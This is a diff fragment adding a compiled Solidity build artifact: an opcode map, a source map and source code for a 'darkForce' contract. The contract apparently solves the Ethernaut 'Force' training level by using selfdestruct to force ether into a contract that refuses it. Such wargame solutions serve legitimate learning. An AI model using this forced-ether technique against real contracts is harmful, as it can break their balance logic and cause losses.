+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "MLOAD",
+      "path": "0"
+    },
+    "114": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "DUP1",
+      "path": "0"
+    },
+    "115": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "SWAP2",
+      "path": "0"
+    },
+    "116": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "SUB",
+      "path": "0"
+    },
+    "117": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "SWAP1",
+      "path": "0"
+    },
+    "118": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "RETURN",
+      "path": "0"
+    },
+    "119": {
+      "fn": "darkForce.deposit",
+      "offset": [
+        501,
+        582
+      ],
+      "op": "JUMPDEST",
+      "path": "0"
+    },
+    "120": {
+      "fn": "darkForce.deposit",
+      "offset": [
+        501,
+        582
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x3B"
+    },
+    "122": {
+      "fn": "darkForce.deposit",
+      "offset": [
+        501,
+        582
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x8B"
+    },
+    "124": {
+      "fn": "darkForce.deposit",
+      "jump": "i",
+      "offset": [
+        501,
+        582
+      ],
+      "op": "JUMP",
+      "path": "0"
+    },
+    "125": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        416,
+        495
+      ],
+      "op": "JUMPDEST",
+      "path": "0"
+    },
+    "126": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        474,
+        487
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "statement": 0,
+      "value": "0x1"
+    },
+    "128": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        474,
+        487
+      ],
+      "op": "SLOAD",
+      "path": "0"
+    },
+    "129": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "131": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "133": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "135": {
+      "op": "SHL"
+    },
+    "136": {
+      "op": "SUB"
+    },
+    "137": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        474,
+        487
+      ],
+      "op": "AND",
+      "path": "0"
+    },
+    "138": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        461,
+        488
+      ],
+      "op": "SELFDESTRUCT",
+      "path": "0"
+    },
+    "139": {
+      "fn": "darkForce.deposit",
+      "offset": [
+        501,
+        582
+      ],
+      "op": "JUMPDEST",
+      "path": "0"
+    },
+    "140": {
+      "fn": "darkForce.deposit",
+      "offset": [
+        566,
+        575
+      ],
+      "op": "CALLVALUE",
+      "path": "0",
+      "statement": 1
+    },
+    "141": {
+      "fn": "darkForce.deposit",
+      "offset": [
+        556,
+        563
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x2"
+    },
+    "143": {
+      "fn": "darkForce.deposit",
+      "offset": [
+        556,
+        563
+      ],
+      "op": "SLOAD",
+      "path": "0"
+    },
+    "144": {
+      "fn": "darkForce.deposit",
+      "offset": [
+        556,
+        575
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x97"
+    },
+    "146": {
+      "fn": "darkForce.deposit",
+      "offset": [
+        556,
+        575
+      ],
+      "op": "SWAP2",
+      "path": "0"
+    },
+    "147": {
+      "fn": "darkForce.deposit",
+      "offset": [
+        556,
+        575
+      ],
+      "op": "SWAP1",
+      "path": "0"
+    },
+    "148": {
+      "fn": "darkForce.deposit",
+      "offset": [
+        556,
+        575
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x9C"
+    },
+    "150": {
+      "fn": "darkForce.deposit",
+      "jump": "i",
+      "offset": [
+        556,
+        575
+      ],
+      "op": "JUMP",
+      "path": "0"
+    },
+    "151": {
+      "fn": "darkForce.deposit",
+      "offset": [
+        556,
+        575
+      ],
+      "op": "JUMPDEST",
+      "path": "0"
+    },
+    "152": {
+      "fn": "darkForce.deposit",
+      "offset": [
+        546,
+        553
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x2"
+    },
+    "154": {
+      "fn": "darkForce.deposit",
+      "offset": [
+        546,
+        575
+      ],
+      "op": "SSTORE",
+      "path": "0"
+    },
+    "155": {
+      "fn": "darkForce.deposit",
+      "jump": "o",
+      "offset": [
+        501,
+        582
+      ],
+      "op": "JUMP",
+      "path": "0"
+    },
+    "156": {
+      "op": "JUMPDEST"
+    },
+    "157": {
+      "op": "DUP1"
+    },
+    "158": {
+      "op": "DUP3"
+    },
+    "159": {
+      "op": "ADD"
+    },
+    "160": {
+      "op": "DUP1"
+    },
+    "161": {
+      "op": "DUP3"
+    },
+    "162": {
+      "op": "GT"
+    },
+    "163": {
+      "op": "ISZERO"
+    },
+    "164": {
+      "op": "PUSH1",
+      "value": "0xBC"
+    },
+    "166": {
+      "op": "JUMPI"
+    },
+    "167": {
+      "op": "PUSH4",
+      "value": "0x4E487B71"
+    },
+    "172": {
+      "op": "PUSH1",
+      "value": "0xE0"
+    },
+    "174": {
+      "op": "SHL"
+    },
+    "175": {
+      "op": "PUSH1",
+      "value": "0x0"
+    },
+    "177": {
+      "op": "MSTORE"
+    },
+    "178": {
+      "op": "PUSH1",
+      "value": "0x11"
+    },
+    "180": {
+      "op": "PUSH1",
+      "value": "0x4"
+    },
+    "182": {
+      "op": "MSTORE"
+    },
+    "183": {
+      "op": "PUSH1",
+      "value": "0x24"
+    },
+    "185": {
+      "op": "PUSH1",
+      "value": "0x0"
+    },
+    "187": {
+      "op": "REVERT"
+    },
+    "188": {
+      "op": "JUMPDEST"
+    },
+    "189": {
+      "op": "SWAP3"
+    },
+    "190": {
+      "op": "SWAP2"
+    },
+    "191": {
+      "op": "POP"
+    },
+    "192": {
+      "op": "POP"
+    },
+    "193": {
+      "jump": "o",
+      "op": "JUMP"
+    }
+  },
+  "sha1": "3fd0ebc5bfd885230c92aee2687c4952a945cddb",
+  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Force {/*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =\u00f8= /\n (______)__m_m)\n\n*/}\n\ncontract darkForce{\n    Force public force;\n    address payable forcecontract;\n    uint256 balance;\n\n    constructor(address _addressForce){\n        force = Force(_addressForce);\n        forcecontract = payable(address(force));\n    }\n\n    function destruct() payable public {\n        selfdestruct(forcecontract);\n    }\n\n    function deposit() external payable{\n        balance = balance + msg.value;\n    }\n}",
+  "sourceMap": "177:407:0:-:0;;;282:128;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;326:5;:28;;-1:-1:-1;;;;;326:28:0;;;-1:-1:-1;;;;;;326:28:0;;;;;;;;;364:39;;;;;;;;177:407;;14:290:1;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:1;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:1:o;:::-;177:407:0;;;;;;",
+  "sourcePath": "contracts/ethernaut_force.sol",
+  "type": "contract"
+}
